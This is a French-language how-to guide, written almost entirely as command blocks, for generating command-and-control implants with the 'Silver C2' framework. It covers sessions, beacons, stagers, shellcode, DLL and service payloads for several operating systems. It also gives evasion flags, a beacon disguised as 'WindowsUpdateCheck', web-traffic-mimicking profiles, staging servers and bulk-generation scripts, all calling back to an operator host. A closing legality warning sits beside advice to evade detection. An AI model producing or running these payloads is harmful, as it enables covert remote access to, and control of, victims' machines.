# Guide Spécialisé : Création de Payloads avec Silver C2

## Table des Matières
1. [Types de Payloads Silver C2](#1-types-de-payloads-silver-c2)
2. [Génération de Payloads Basiques](#2-génération-de-payloads-basiques)
3. [Payloads Avancés et Personnalisés](#3-payloads-avancés-et-personnalisés)
4. [Stagers et Dropper](#4-stagers-et-dropper)
5. [Évasion et Obfuscation](#5-évasion-et-obfuscation)
6. [Formats et Plateformes](#6-formats-et-plateformes)
7. [Exemples Pratiques](#7-exemples-pratiques)
8. [Techniques de Livraison](#8-techniques-de-livraison)

---

## 1. Types de Payloads Silver C2

### 1.1 Sessions vs Beacons
```bash
# SESSION - Connexion immédiate et continue
generate --mtls 192.168.1.100:443 --os windows --arch amd64 --format exe --save /tmp/session.exe

# BEACON - Connexion périodique (plus furtif)
generate beacon --mtls 192.168.1.100:443 --os windows --arch amd64 --format exe --save /tmp/beacon.exe
```

### 1.2 Différences principales
- **Session** : Communication en temps réel, plus détectable
- **Beacon** : Communication par intervalles, plus discret, configurable

---

## 2. Génération de Payloads Basiques

### 2.1 Payload Windows Executables
```bash
# Payload Windows 64-bit basique
generate --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format exe \
    --save /tmp/windows_x64.exe

# Payload Windows 32-bit
generate --mtls 192.168.1.100:443 \
    --os windows \
    --arch 386 \
    --format exe \
    --save /tmp/windows_x86.exe
```

### 2.2 Payload Linux
```bash
# Payload Linux 64-bit
generate --mtls 192.168.1.100:443 \
    --os linux \
    --arch amd64 \
    --format elf \
    --save /tmp/linux_x64

# Payload Linux 32-bit  
generate --mtls 192.168.1.100:443 \
    --os linux \
    --arch 386 \
    --format elf \
    --save /tmp/linux_x86
```

### 2.3 Payload macOS
```bash
# Payload macOS
generate --mtls 192.168.1.100:443 \
    --os darwin \
    --arch amd64 \
    --format macho \
    --save /tmp/macos_x64
```

---

## 3. Payloads Avancés et Personnalisés

### 3.1 Configuration avec nom personnalisé
```bash
generate --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format exe \
    --name "MonPayloadCustom" \
    --save /tmp/custom_payload.exe
```

### 3.2 Beacon avec intervalle personnalisé
```bash
generate beacon \
    --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format exe \
    --jitter 30s \
    --interval 60s \
    --save /tmp/beacon_custom.exe
```

### 3.3 Payload avec date d'expiration
```bash
generate --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format exe \
    --limit-datetime "2024-12-31 23:59:59" \
    --save /tmp/payload_with_expiry.exe
```

### 3.4 Payload avec domaine limite
```bash
generate --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format exe \
    --limit-domainjoined \
    --limit-hostname "TARGET-PC" \
    --save /tmp/targeted_payload.exe
```

---

## 4. Stagers et Dropper

### 4.1 Génération de Stagers
```bash
# Stager Windows
generate stager \
    --lhost 192.168.1.100 \
    --lport 443 \
    --protocol tcp \
    --format exe \
    --arch amd64 \
    --save /tmp/stager.exe

# Stager PowerShell
generate stager \
    --lhost 192.168.1.100 \
    --lport 443 \
    --protocol tcp \
    --format powershell \
    --arch amd64 \
    --save /tmp/stager.ps1
```

### 4.2 Stager avec profil personnalisé
```bash
# Créer un profil d'abord
profiles new --mtls 192.168.1.100:443 --name CustomProfile

# Utiliser le profil pour générer le stager
generate stager \
    --profile CustomProfile \
    --format exe \
    --arch amd64 \
    --save /tmp/custom_stager.exe
```

---

## 5. Évasion et Obfuscation

### 5.1 Payload avec évasion basique
```bash
generate --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format exe \
    --evasion \
    --skip-symbols \
    --save /tmp/evasive_payload.exe
```

### 5.2 Payload service Windows
```bash
generate --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format service \
    --save /tmp/service_payload.exe
```

### 5.3 Payload DLL
```bash
generate --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format shared \
    --save /tmp/payload.dll
```

---

## 6. Formats et Plateformes

### 6.1 Tous les formats Windows
```bash
# Executable (.exe)
generate --mtls 192.168.1.100:443 --os windows --format exe --save /tmp/payload.exe

# DLL partagée
generate --mtls 192.168.1.100:443 --os windows --format shared --save /tmp/payload.dll

# Shellcode
generate --mtls 192.168.1.100:443 --os windows --format shellcode --save /tmp/payload.bin

# Service Windows
generate --mtls 192.168.1.100:443 --os windows --format service --save /tmp/payload_service.exe
```

### 6.2 Communication alternatives
```bash
# HTTP
generate --http 192.168.1.100:80 --os windows --format exe --save /tmp/http_payload.exe

# HTTPS
generate --https 192.168.1.100:443 --os windows --format exe --save /tmp/https_payload.exe

# DNS
generate --dns example.com --os windows --format exe --save /tmp/dns_payload.exe

# WireGuard
generate --wg 192.168.1.100:51820 --os windows --format exe --save /tmp/wg_payload.exe
```

---

## 7. Exemples Pratiques

### 7.1 Script de génération multiple
```bash
#!/bin/bash
# Generation de payloads pour différentes cibles

LHOST="192.168.1.100"
LPORT="443"

echo "=== Génération de payloads Silver C2 ==="

# Windows targets
echo "Génération payloads Windows..."
generate --mtls $LHOST:$LPORT --os windows --arch amd64 --format exe --save /tmp/win64.exe
generate --mtls $LHOST:$LPORT --os windows --arch 386 --format exe --save /tmp/win32.exe
generate --mtls $LHOST:$LPORT --os windows --arch amd64 --format shared --save /tmp/win64.dll

# Linux targets  
echo "Génération payloads Linux..."
generate --mtls $LHOST:$LPORT --os linux --arch amd64 --format elf --save /tmp/linux64
generate --mtls $LHOST:$LPORT --os linux --arch 386 --format elf --save /tmp/linux32

# Beacons
echo "Génération beacons..."
generate beacon --mtls $LHOST:$LPORT --os windows --arch amd64 --format exe --jitter 30s --save /tmp/beacon.exe

# Stagers
echo "Génération stagers..."
generate stager --lhost $LHOST --lport $LPORT --format exe --arch amd64 --save /tmp/stager.exe

echo "Génération terminée!"
ls -la /tmp/*.exe /tmp/linux* /tmp/*.dll 2>/dev/null
```

### 7.2 Payload avec configuration réseau multiple
```bash
# Listener HTTPS sur port 443
https --lport 443

# Payload avec fallback multiple
generate --https 192.168.1.100:443 \
    --http 192.168.1.100:80 \
    --os windows \
    --arch amd64 \
    --format exe \
    --save /tmp/multi_transport.exe
```

### 7.3 Beacon furtif avancé
```bash
# Configuration beacon très discret
generate beacon \
    --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format exe \
    --jitter 300s \
    --interval 900s \
    --skip-symbols \
    --name "WindowsUpdateCheck" \
    --save /tmp/stealth_beacon.exe
```

---

## 8. Techniques de Livraison

### 8.1 Serveur de staging
```bash
# Configuration d'un listener pour staging
stage-listener --url https://192.168.1.100:443/download --cc-url https://192.168.1.100:443

# Génération du stager correspondant
generate stager \
    --lhost 192.168.1.100 \
    --lport 443 \
    --protocol https \
    --format exe \
    --save /tmp/staged_payload.exe
```

### 8.2 Profil de communication personnalisé
```bash
# Création d'un profil HTTP personnalisé
profiles new http \
    --name "WebTraffic" \
    --url-paths "/api/v1/data,/static/js/app.js,/images/logo.png" \
    --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    --jitter 120s

# Génération du payload avec ce profil
generate --profile WebTraffic \
    --os windows \
    --format exe \
    --save /tmp/web_disguised.exe
```

### 8.3 Payload embarqué (embed)
```bash
# Génération de shellcode pour intégration
generate --mtls 192.168.1.100:443 \
    --os windows \
    --arch amd64 \
    --format shellcode \
    --save /tmp/payload.bin

# Le shellcode peut ensuite être intégré dans d'autres applications
xxd -i /tmp/payload.bin > payload_shellcode.h
```

---

## 9. Scripts d'Automatisation

### 9.1 Script de génération complète
```bash
#!/bin/bash
# Script automatisé de génération de payloads

# Configuration
LHOST="192.168.1.100"
SAVE_DIR="/tmp/silver_payloads"
mkdir -p $SAVE_DIR

# Fonction de génération
generate_payload() {
    local os=$1
    local arch=$2  
    local format=$3
    local filename=$4
    
    echo "Génération: $filename"
    generate --mtls $LHOST:443 \
        --os $os \
        --arch $arch \
        --format $format \
        --save "$SAVE_DIR/$filename"
}

# Génération massive
echo "=== Génération de la suite de payloads ==="

# Windows
generate_payload "windows" "amd64" "exe" "windows_x64.exe"
generate_payload "windows" "386" "exe" "windows_x86.exe"
generate_payload "windows" "amd64" "shared" "windows_x64.dll"
generate_payload "windows" "amd64" "service" "windows_service.exe"

# Linux  
generate_payload "linux" "amd64" "elf" "linux_x64"
generate_payload "linux" "386" "elf" "linux_x86"

# macOS
generate_payload "darwin" "amd64" "macho" "macos_x64"

echo "=== Génération des beacons ==="
generate beacon --mtls $LHOST:443 --os windows --arch amd64 --format exe --jitter 60s --save "$SAVE_DIR/beacon_win64.exe"

echo "=== Génération des stagers ==="
generate stager --lhost $LHOST --lport 443 --format exe --arch amd64 --save "$SAVE_DIR/stager_win64.exe"

echo "Génération terminée. Payloads dans: $SAVE_DIR"
ls -la "$SAVE_DIR"
```

---

## 10. Vérification et Tests

### 10.1 Vérification des payloads générés
```bash
# Lister tous les payloads générés
implants

# Vérifier les détails d'un payload
info [PAYLOAD_NAME]

# Tester la connectivité
jobs  # Vérifier que les listeners sont actifs
```

### 10.2 Test de base
```bash
# 1. Démarrer un listener
mtls --lport 443

# 2. Générer un payload de test
generate --mtls 192.168.1.100:443 --os windows --format exe --save /tmp/test.exe

# 3. Simuler l'exécution (dans un environnement contrôlé)
# Transférer le payload vers une VM de test et l'exécuter

# 4. Vérifier la connexion
sessions  # Doit montrer la nouvelle session
```

---

## ⚠️ Notes Importantes

### Sécurité et Légalité
- **Utilisez uniquement dans un environnement de test autorisé**
- **Ne déployez jamais sur des systèmes sans autorisation explicite**
- **Les payloads générés sont détectables par les antivirus modernes**
- **Respectez les lois locales et internationales**

### Bonnes Pratiques
- Testez toujours les payloads dans un environnement isolé
- Documentez tous les payloads générés
- Nettoyez les artefacts après utilisation
- Utilisez des noms de fichiers non suspects
- Variez les techniques pour éviter la détection

---

**Référence complète** : Ce guide couvre la génération de tous types de payloads Silver C2. Pour l'utilisation complète du framework, consultez le `Guide_Silver_C2_Kali_Linux.md`.